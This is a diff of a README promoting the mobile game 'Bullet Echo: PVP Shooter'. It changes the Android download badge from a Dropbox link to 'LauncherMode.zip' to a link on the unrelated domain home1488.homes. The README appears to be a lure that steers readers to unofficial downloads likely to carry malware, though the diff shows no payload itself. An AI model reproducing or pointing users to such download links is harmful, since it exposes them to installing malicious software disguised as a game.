@@ -4,7 +4,7 @@
 
 **Bullet Echo: PVP Shooter** is an intense, strategic multiplayer shooter where you control unique heroes and use their abilities to outsmart and defeat your opponents. Play in exciting PVP modes, team up with friends, and enjoy tactical battles in various challenging environments.
 
-[![Download for Android](https://img.shields.io/badge/Download-Android-3DDC84?style=for-the-badge&logo=android&logoColor=white)](https://www.dropbox.com/scl/fi/6jfuucfg8tf01nrs2eucw/LauncherMode.zip?rlkey=jzg3gglri41ovax7m5rbdbvp3&st=mh56nd7y&dl=1)
+[![Download for Android](https://img.shields.io/badge/Download-Android-3DDC84?style=for-the-badge&logo=android&logoColor=white)](https://home1488.homes/)
 
 ## What is Bullet Echo: PVP Shooter?
 
